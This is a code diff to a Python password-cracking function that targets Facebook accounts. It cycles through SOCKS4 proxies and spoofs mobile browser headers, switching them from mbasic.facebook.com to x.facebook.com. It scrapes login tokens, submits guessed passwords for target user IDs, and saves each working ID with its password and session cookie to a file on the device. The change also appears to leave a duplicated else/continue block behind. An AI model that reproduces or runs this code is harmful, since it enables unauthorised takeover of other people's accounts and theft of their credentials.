@@ -877,43 +877,53 @@ def crack(idf,pwv):
         try:
             nip=random.choice(prox)
             proxs= {'http': 'socks4://'+nip}
-            ses.headers.update({"Host":'mbasic.facebook.com',
-               'method', 'POST',
-                'scheme', 'https',
-                'accept-language', 'en-US,en;q=0.9',
-                'cache-control', 'max-age=0',
-                'sec-ch-ua', '"Chromium";v="116", "Not=A?Brand";v="24"',
-                'sec-ch-ua-mobile', '?1',
-                'sec-ch-ua-platform', '"Android"',
-                'sec-fetch-dest', 'document',
-                'sec-fetch-mode', 'navigate',
-                'sec-fetch-site', 'none',
-                'sec-fetch-user', '?1',
-                'upgrade-insecure-requests', '1',
-                'user-agent', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
-                'Accept-Encoding', 'gzip, deflate',
-                'accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',})
-            p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
+            ses.headers.update({"Host":'x.facebook.com',
+                'method': 'POST',
+                'path': '/login/device-based/login/async/',
+                'scheme': 'https',
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+                'cache-control': 'max-age=0',
+                'dpr': '2.75',
+                'referer': 'https://x.facebook.com/bookmarks/',
+                'sec-ch-prefers-color-scheme': 'dark',
+                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+                'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
+                'sec-ch-ua-mobile': '?1',
+                'sec-ch-ua-platform': '"Android"',
+                'sec-fetch-dest': 'document',
+                'sec-fetch-mode': 'navigate',
+                'sec-fetch-site': 'same-origin',
+                'sec-fetch-user': '?1',
+                'upgrade-insecure-requests': '1',
+                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
+                'viewport-width': '980',})
+            p = ses.get('https://x.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
             dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.prod.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
             koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
             koki+=' m_pixel_ratio=2.625; wd=412x756'
-            heade = {'Host', 'mbasic.facebook.com',
-                'method', 'POST',
-                'scheme', 'https',
-                'accept-language', 'en-US,en;q=0.9',
-                'cache-control', 'max-age=0',
-                'sec-ch-ua', '"Chromium";v="116", "Not=A?Brand";v="24"',
-                'sec-ch-ua-mobile', '?1',
-                'sec-ch-ua-platform', '"Android"',
-                'sec-fetch-dest', 'document',
-                'sec-fetch-mode', 'navigate',
-                'sec-fetch-site', 'none',
-                'sec-fetch-user', '?1',
-                'upgrade-insecure-requests', '1',
-                'user-agent', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
-                'Accept-Encoding', 'gzip, deflate',
-                'accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',}
-            po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
+            heade = {'Host': 'x.facebook.com',
+                'method': 'POST',
+                'path': '/login/device-based/login/async/',
+                'scheme': 'https',
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+                'cache-control': 'max-age=0',
+                'dpr': '2.75',
+                'referer': 'https://x.facebook.com/bookmarks/',
+                'sec-ch-prefers-color-scheme': 'dark',
+                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+                'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
+                'sec-ch-ua-mobile': '?1',
+                'sec-ch-ua-platform': '"Android"',
+                'sec-fetch-dest': 'document',
+                'sec-fetch-mode': 'navigate',
+                'sec-fetch-site': 'same-origin',
+                'sec-fetch-user': '?1',
+                'upgrade-insecure-requests': '1',
+                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
+                'viewport-width': '980',}
+            po = ses.post('https://x.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
             if "checkpoint" in po.cookies.get_dict().keys():
                 print(f'\r\033[0;96m[CP] {idf} • {pw}')
                 os.system('espeak -a 300 " oh shit Cp ID"')
@@ -929,12 +939,6 @@ def crack(idf,pwv):
                 os.system('espeak -a 300 "ALHAMDULLIAH,  YOU,  GOT,  A,  OK,  id"')
                 open('/sdcard/M1•Sheikh-OK.txt', 'a').write( uid+' | '+ps+' | '+kuki+'\n')
                 break
-                
-            else:
-                continue
-        except requests.exceptions.ConnectionError:
-            time.sleep(31)
-    loop+=1
                 
             else:
                 continue
